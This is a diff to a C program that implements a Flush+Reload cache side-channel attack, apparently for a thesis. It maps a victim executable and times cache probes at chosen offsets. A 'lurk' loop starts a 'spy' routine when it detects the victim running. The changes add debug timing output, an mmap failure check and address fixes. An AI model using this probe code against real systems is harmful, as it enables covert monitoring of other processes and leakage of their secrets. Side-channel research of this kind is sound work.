@@ -1,15 +1,15 @@
 #include <fcntl.h> // TODO remove unneeded libs
-//#include <stdbool.h>
+#include <stdbool.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/mman.h>
 #include <unistd.h>
 #include <stdint.h>
 
-#define THRESHOLD 180
-#define CYCLE_AMOUNT 200000
+#define THRESHOLD (int) 180
+#define CYCLE_AMOUNT (int) 200000
 
-#define MEASUREMENT_THRESHOLD
+#define MEASUREMENT_THRESHOLD // toggle for 0/1 measurements
 
 // DaGe f+r implementation
 #define busy_wait(cycles) for(volatile long i_ = 0; i_ != cycles; i_++); // importance?
@@ -18,6 +18,7 @@
 
 #define DEBUG
 //#define DEBUG_PLUS
+#define DEBUG_TIME
 
 // probe from paper
 int probe_treshold(char *adrs)
@@ -37,6 +38,9 @@ int probe_treshold(char *adrs)
         : "=a" (time)
         : "c" (adrs)
         : "%esi", "%edx");
+    #ifdef DEBUG_TIME
+    printf("measured time is %i\n", time);
+    #endif
     return time < THRESHOLD; 
 }
 
@@ -59,6 +63,9 @@ int probe_precise(char *adrs)
         : "=a" (time)
         : "c" (adrs)
         : "%esi", "%edx");
+    #ifdef DEBUG_TIME
+    printf("measured time is %i\n", time);
+    #endif
     return time; 
 }
 
@@ -145,16 +152,19 @@ void spy(char **target_adrs, int adrs_amount)
 
 void lurk(char* target_base_adrs, char **target_adrs, int adrs_amount)
 {
+    unsigned long long old_tsc, tsc = rdtsc();
     while(1)
     {
-        unsigned long long old_tsc, tsc = rdtsc();
+        old_tsc = tsc;
+        tsc=rdtsc();
         while (tsc - old_tsc < 2500) // TODO why 2500/500 cycles per slot now, depending on printf
         {
             tsc = rdtsc();
         }
-        if (probe_treshold(target_base_adrs))
+        bool detected = probe_treshold(target_base_adrs);
+        if (detected)
         {
-            printf("Detected victim activity - starting spy \n");
+            printf("Detected %d victim activity - starting spy \n", detected);
             spy(target_adrs, adrs_amount);
         }
     }
@@ -175,12 +185,13 @@ void control()
     #endif
     // --------------------
 
-
-
     int map_len         = 10; // max size bytes?
     int file_descriptor = open("C:/cygwin64/home/thesis/flush-reload/textexec.exe", O_RDONLY); // hard coded path to open the executable used by the victim 
     void *base          = mmap(NULL, map_len, PROT_READ, MAP_FILE | MAP_SHARED, file_descriptor, 0); // MAP_FILE ignored (?)
-
+    if (base == MAP_FAILED) {
+        perror("mmap failed!");
+        exit(1);
+    }
     // TODO offsets (?)
 
     // TODO switch off ASLR
@@ -191,12 +202,11 @@ void control()
     char *target_adrs[amount_address_offsets];
     for (int i= 0; i<amount_address_offsets; i++)
     {
-        target_adrs[i]=(char *) base+target_offset[i];
+        target_adrs[i]=(char *) target_base+target_offset[i];
     }
-    //0x1004010be-0x100401080;//0x0000000100401133;
-    //0x1004010d2-0x100401080;//0x1004010d5; //0x0000000000095f5d;
+
     #ifdef DEBUG
-    printf("addresses are %p and %p, binary mapped to %p \n", target_adrs[0], target_adrs[1], base); // debug
+    printf("addresses are %p and %p, binary mapped to %p \n", target_adrs[0], target_adrs[1], target_base); // debug
     #endif
     int adrs_amount = 2;
     lurk(target_base, target_adrs, adrs_amount);
@@ -206,11 +216,10 @@ void control()
 int main()
 {
     #ifdef DEBUG_PLUS
-    void (*fPtrSpy)() = &spy; // omg thanks chat gpt
+    void (*fPtrSpy)() = &spy;
     int (*fPtrMain)() = &main;
     void (*fPtrWriter)() = &writer;
     void (*fPtrControl)() = &control;
-    
     printf("Adresse der Funktion spy: %p, main %p, writer %p, control %p\n", fPtrSpy, fPtrMain, fPtrWriter, fPtrControl);
     #endif
     printf("starting\n");
